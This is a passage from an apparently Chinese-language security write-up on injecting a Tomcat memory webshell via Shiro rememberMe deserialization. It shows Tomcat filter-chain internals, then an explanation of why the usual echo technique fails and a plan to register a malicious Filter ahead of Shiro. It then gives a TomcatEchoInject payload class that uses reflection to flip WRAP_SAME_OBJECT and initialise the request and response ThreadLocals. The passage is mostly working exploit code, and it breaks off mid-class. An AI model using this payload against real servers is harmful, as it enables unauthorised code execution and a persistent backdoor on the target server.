&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ApplicationDispatcher&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">WRAP_SAME_OBJECT&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">lastServicedRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">lastServicedResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAsyncSupported&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">servletSupportsAsync&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAttribute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.catalina.ASYNC_SUPPORTED&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Boolean&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FALSE&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">HttpServletRequest&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">HttpServletResponse&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">GlobalsIS_SECURITY_ENABLED&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Principal&lt;/span> &lt;span style="color:#111">principal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">HttpServletRequest&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">getUserPrincipal&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SecurityUtil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">doAsPrivilege&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;service&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">servlet&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">classTypeUsedInService&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">principal&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">servlet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">service&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletException&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#111">var17&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">var17&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">var18&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ExceptionUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">unwrapInvocationTargetException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var18&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ExceptionUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">handleThrowable&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ServletException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">sm&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;filterChain.servlet&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">finally&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ApplicationDispatcher&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">WRAP_SAME_OBJECT&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">lastServicedRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">lastServicedResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们仔细看lastServicedRequest出现的位置，是在所有的Filter都执行完毕后才会进行set，而shiro的rememberMe功能就是shiro自己实现的一个filter，常规的打法都是将payload塞入rememberMe中，所以当获取到lastServicedRequest/Response时已经反序列化完了，就不可能再注入内存马了&lt;/p>
&lt;p>既然如此，我们就以毒攻毒——动态注册一个Filter内存马并把它放在最前面，先于shiro的rememberMe执行&lt;/p>
&lt;p>其实本质和上面的是一样的，我们将那一段恶意代码手动放入继承了AbstractTranslet的类中&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.DOM&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.TransletException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xml.internal.serializer.SerializationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * @author threedr3am
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TomcatEchoInject&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">AbstractTranslet&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/*刚开始反序列化后执行的逻辑*/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//修改 WRAP_SAME_OBJECT 值为 true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.catalina.core.ApplicationDispatcher&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;WRAP_SAME_OBJECT&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Field&lt;/span> &lt;span style="color:#111">modifiersField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;modifiers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FINAL&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBoolean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setBoolean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//初始化 lastServicedRequest
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.catalina.core.ApplicationFilterChain&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;lastServicedRequest&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;modifiers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FINAL&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ThreadLocal&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//初始化 lastServicedResponse
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;lastServicedResponse&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;modifiers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FINAL&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ThreadLocal&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">DOM&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SerializationHandler&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">handlers&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">TransletException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
